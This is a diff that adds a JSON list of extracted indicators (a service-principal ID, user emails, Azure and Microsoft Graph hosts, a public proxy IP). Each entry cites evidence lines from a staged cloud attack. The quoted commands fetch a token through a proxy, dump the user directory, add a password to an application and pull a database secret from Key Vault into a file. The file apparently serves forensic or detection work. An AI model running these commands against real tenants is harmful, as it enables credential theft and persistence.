@@ -1,0 +1,82 @@
+[
+  {
+    "kind": "username",
+    "value": "66666666-7777-4888-9999-000000000000",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 1,
+    "scripts": "20261015_090000_step01_token.sh:8",
+    "evidence": "az login --service-principal -u \"$APP\" -p \"$SECRET\" --tenant \"$TENANT\" (20261015_090000_step01_token.sh:8)"
+  },
+  {
+    "kind": "email",
+    "value": "alice@corp.example",
+    "origin": "discovered",
+    "from": "directory_20261015_090530.txt:1",
+    "scope": null,
+    "count": 1,
+    "scripts": "20261015_092000_step04_collect.py:7",
+    "evidence": "for user in [\"alice@corp.example\", \"bob@corp.example\"]: (20261015_092000_step04_collect.py:7)"
+  },
+  {
+    "kind": "email",
+    "value": "bob@corp.example",
+    "origin": "discovered",
+    "from": "directory_20261015_090530.txt:1",
+    "scope": null,
+    "count": 1,
+    "scripts": "20261015_092000_step04_collect.py:7",
+    "evidence": "for user in [\"alice@corp.example\", \"bob@corp.example\"]: (20261015_092000_step04_collect.py:7)"
+  },
+  {
+    "kind": "device",
+    "value": "corpvault.vault.azure.net",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 1,
+    "scripts": "20261015_093000_step05_vault.sh:7",
+    "evidence": "curl -s -H \"Authorization: Bearer $KV\" \"https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4\" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)"
+  },
+  {
+    "kind": "device",
+    "value": "graph.microsoft.com",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 4,
+    "scripts": "20261015_090000_step01_token.sh:5, 20261015_090500_step02_recon.ps1:2, 20261015_091000_step03_escalate.ps1:3, 20261015_092000_step04_collect.py:5",
+    "evidence": "curl -s -x http://144.172.64.128:8080 -d \"client_id=$APP\" -d \"scope=https://graph.microsoft.com/.default\" \\ (20261015_090000_step01_token.sh:5)\nInvoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/users?`$top=999\" | ConvertTo-Json | Out-File directory_20261015_090530.txt (20261015_090500_step02_recon.ps1:2)\nInvoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword\" -Body '{}' (20261015_091000_step03_escalate.ps1:3)\nGRAPH = \"https://graph.microsoft.com/v1.0\" (20261015_092000_step04_collect.py:5)"
+  },
+  {
+    "kind": "device",
+    "value": "login.microsoftonline.com",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 1,
+    "scripts": "20261015_090000_step01_token.sh:7",
+    "evidence": "\"https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token\" > token_20261015_090010.json (20261015_090000_step01_token.sh:7)"
+  },
+  {
+    "kind": "device",
+    "value": "corp.example",
+    "origin": "discovered",
+    "from": "directory_20261015_090530.txt:1",
+    "scope": null,
+    "count": 1,
+    "scripts": "20261015_092000_step04_collect.py:7",
+    "evidence": "for user in [\"alice@corp.example\", \"bob@corp.example\"]: (20261015_092000_step04_collect.py:7)"
+  },
+  {
+    "kind": "ip",
+    "value": "144.172.64.128",
+    "origin": "prior",
+    "from": null,
+    "scope": "public",
+    "count": 1,
+    "scripts": "20261015_090000_step01_token.sh:5",
+    "evidence": "curl -s -x http://144.172.64.128:8080 -d \"client_id=$APP\" -d \"scope=https://graph.microsoft.com/.default\" \\ (20261015_090000_step01_token.sh:5)"
+  }
+]
